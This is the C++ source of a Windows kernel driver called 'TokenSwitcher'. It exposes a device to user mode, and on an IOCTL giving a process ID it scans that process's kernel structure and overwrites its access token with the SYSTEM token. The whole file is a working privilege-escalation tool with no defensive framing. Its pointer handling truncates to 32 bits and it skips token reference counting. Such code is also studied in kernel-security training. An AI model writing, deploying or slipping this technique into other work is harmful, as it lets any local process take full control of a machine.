#include <ntifs.h>
#include <ntddk.h>
#include "TokenSwitcherCommon.h"

void DriverUnload(PDRIVER_OBJECT);
NTSTATUS TokenSwitcherDeviceControl(PDEVICE_OBJECT, PIRP);
NTSTATUS TokenSwitcherCreateClose(PDEVICE_OBJECT, PIRP);
void SwitchToken(PEPROCESS process, PACCESS_TOKEN token);

extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING)
{
	auto status = STATUS_SUCCESS;
	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\TokenSwitcher");
	UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\TokenSwitcher");
	PDEVICE_OBJECT DeviceObject = nullptr;
	do
	{
		status = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, 0, TRUE, &DeviceObject);
		if (!NT_SUCCESS(status))
		{
			KdPrint(("[-] Failed to create device object.\n"));
			break;
		}
		status = IoCreateSymbolicLink(&symLink, &devName);
		if (!NT_SUCCESS(status))
		{
			IoDeleteDevice(DeviceObject);
			KdPrint(("[-] Failed to create symbolic link.\n"));
			break;
		}
	} while (false);

	DriverObject->DriverUnload = DriverUnload;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = TokenSwitcherCreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = TokenSwitcherCreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = TokenSwitcherDeviceControl;

	KdPrint(("[+] Driver loaded successfully!\n"));

	return status;
}

void DriverUnload(PDRIVER_OBJECT DriverObject)
{
	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\TokenSwitcher");
	
	IoDeleteSymbolicLink(&symLink);
	IoDeleteDevice(DriverObject->DeviceObject);
	KdPrint(("[+] Driver unloaded successfully!\n"));
}


NTSTATUS TokenSwitcherCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return STATUS_SUCCESS;
}

NTSTATUS TokenSwitcherDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);

	auto stack = IoGetCurrentIrpStackLocation(Irp);
	auto status = STATUS_SUCCESS;

	PEPROCESS process;
	PACCESS_TOKEN token;

	switch (stack->Parameters.DeviceIoControl.IoControlCode)
	{
	
	case IOCTL_TOKEN_SWITCHER_SWITCH_TOKEN:
	{
		auto pid = ULongToHandle(*reinterpret_cast<ULONG*>(Irp->AssociatedIrp.SystemBuffer));
		status = PsLookupProcessByProcessId(pid, &process);
		if (!NT_SUCCESS(status))
		{
			KdPrint(("Failed getting the process;"));
			break;
		}
		token = PsReferencePrimaryToken(process);
		SwitchToken(process, token);
		ObDereferenceObject(token);
		ObDereferenceObject(process);
		
		break;
	}
	default:
	{
		break;
	}
	}

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}

void SwitchToken(PEPROCESS process, PACCESS_TOKEN token)
{
	PACCESS_TOKEN systemToken;
	PULONG ptr;

	systemToken = PsReferencePrimaryToken(PsInitialSystemProcess);
	ptr = reinterpret_cast<PULONG>(process);
	for (ULONG i = 0; i < 1000; i++)
	{
		if ((ptr[i] & ~0xf) == (reinterpret_cast<ULONG>(token) & ~0xf))
		{
			ptr[i] = reinterpret_cast<ULONG>(systemToken);
			break;
		}
	}
	ObfDereferenceObject(systemToken);
}